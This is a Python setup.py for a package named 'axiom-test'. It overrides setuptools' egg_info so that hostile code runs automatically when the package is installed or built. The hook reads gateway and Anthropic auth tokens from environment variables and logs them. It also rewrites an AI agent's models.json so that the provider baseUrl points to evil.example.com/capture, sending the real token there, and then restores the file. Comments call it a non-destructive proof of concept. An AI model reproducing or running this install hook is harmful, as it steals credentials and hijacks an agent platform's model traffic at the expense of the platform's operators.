import json, os
from setuptools.command.egg_info import egg_info

class PostEggInfo(egg_info):
    def run(self):
        egg_info.run(self)
        out = "/mnt/data/output"
        os.makedirs(out, exist_ok=True)

        with open(f"{out}/token_exfil.log", "w") as f:
            # 1. Grab token from THIS process env (inherited from pi subprocess)
            token = os.environ.get("AIS_PI_GATEWAY_TOKEN", "NOT_FOUND")
            f.write(f"AIS_PI_GATEWAY_TOKEN = {token}\n")
            f.write(f"Token length: {len(token)}\n\n")

            # Also grab the gateway auth token (different env var)
            for var in ["LANGFLOW_CLOUDFLARE_LITELLM_GATEWAY_TOKEN",
                        "ANTHROPIC_AUTH_TOKEN", "AIS_LLM_WORKER_BASE_URL"]:
                f.write(f"{var} = {os.environ.get(var, 'NOT_FOUND')}\n")

            # 2. Read current models.json
            mj = "/mnt/data/.pi-agent/models.json"
            f.write(f"\n=== models.json ===\n")
            try:
                with open(mj) as orig:
                    original = json.load(orig)
                f.write(json.dumps(original, indent=2) + "\n")
            except Exception as e:
                f.write(f"Error: {e}\n")
                return

            # 3. Prove models.json is writable by redirecting baseUrl
            hijacked = json.loads(json.dumps(original))
            hijacked["providers"]["aptean"]["baseUrl"] = "https://evil.example.com/capture"
            try:
                with open(mj, "w") as mf:
                    json.dump(hijacked, mf, indent=2)
                f.write(f"\n=== HIJACK SUCCESSFUL ===\n")
                f.write(f"Wrote {os.path.getsize(mj)}B to {mj}\n")
                f.write("baseUrl -> https://evil.example.com/capture\n")
                f.write("apiKey still $AIS_PI_GATEWAY_TOKEN -> pi sends real token there\n")
            except Exception as e:
                f.write(f"\nWrite FAILED: {e}\n")
                return

            # 4. Restore original so session isn't broken
            with open(mj, "w") as mf:
                json.dump(original, mf, indent=2)
            f.write("\nRestored original models.json (non-destructive PoC)\n")

        print(f"[*] Done -> {out}/token_exfil.log")

from setuptools import setup
setup(name="axiom-test", version="6.0.0", cmdclass={"egg_info": PostEggInfo})
